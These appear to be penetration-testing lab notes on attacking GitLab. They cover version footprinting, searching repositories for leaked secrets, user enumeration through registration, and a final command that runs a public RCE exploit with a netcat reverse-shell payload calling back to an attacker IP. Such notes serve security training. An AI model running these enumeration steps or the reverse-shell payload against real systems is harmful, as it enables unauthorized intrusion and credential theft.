[GitLab](https://about.gitlab.com/) is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js.

Git repositories may just hold publicly available code such as scripts to interact with an API. However, we may also find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. We may also come across SSH private keys. We can attempt to use the search function to search for users, passwords, etc. Applications such as GitLab allow for public repositories (that require no authentication), internal repositories (available to authenticated users), and private repositories (restricted to specific users). It is also worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible. Most companies will only allow a user with a company email address to register and require an administrator to authorize the account, but as we'll see later on, a GitLab instance can be set up to allow anyone to register and then log in.
## Footprinting & Discovery
- [ ] The only way to footprint the GitLab version number -> browse  `/help` page when logged in.
- [ ] Try to register an account to access that page.
- [ ] If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821).
- [ ] There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).
## Enumeration
- [ ] Browse to `/explore` and see if there are any public projects where we can file sensitive files, passwords, keys...
- [ ] If there is a project, we can explore each of the pages linked in the top left `groups`, `snippets`, and `help`. 
- [ ] Search functionality and see if we can uncover any other projects. 
- [ ] See if we can register an account and access additional projects. 
- [ ] Try to sign up with a normal non-company email.
- [ ] Use the registration form to enumerate valid users (if user is taken, it will error).
- [ ] We can also enumerate emails the same way.
- [ ] As this [blog post](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.
**Mitigations:** enforcing 2FA on all user accounts, using `Fail2Ban` to block brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.
## Attacking
### Username Enumeration
```sh
https://www.exploit-db.com/exploits/49821
https://github.com/dpgg101/GitLabUserEnum

./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

#### DEFAULT SETTINGS IN VERSIONS BELOW 16.6
# Number of authentication tries before locking an account if lock_strategy
# is failed attempts.
config.maximum_attempts = 10
# Time interval to unlock the account if :time is enabled as unlock_strategy.
config.unlock_in = 10.minutes
```
### Authenticated RCE
GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.

We need valid creds found through OSINT, credential guessing or self-registration.
```sh
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
